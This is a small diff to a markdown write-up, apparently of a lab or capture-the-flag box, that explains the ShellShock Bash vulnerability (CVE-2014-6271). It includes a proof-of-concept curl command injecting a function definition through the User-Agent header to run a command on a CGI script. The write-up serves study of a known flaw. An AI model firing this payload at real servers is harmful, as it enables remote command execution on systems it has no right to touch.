@@ -106,7 +106,7 @@ We find shellshock.
 > ShellShock (also known as Bashdoor or CVE-2014-6271) was a vulnerability in Bash discovered in 2014 that has to do with the Bash syntax for defining a function. The vuln allowed that the attacker run commands in places where they should to do only something safe like setting a environment variable.
 > 
 
-### POC **shellshock:**
+### POC shellshock:
 
 ```bash
 curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id' " http://10.10.10.56/cgi-bin/user.sh
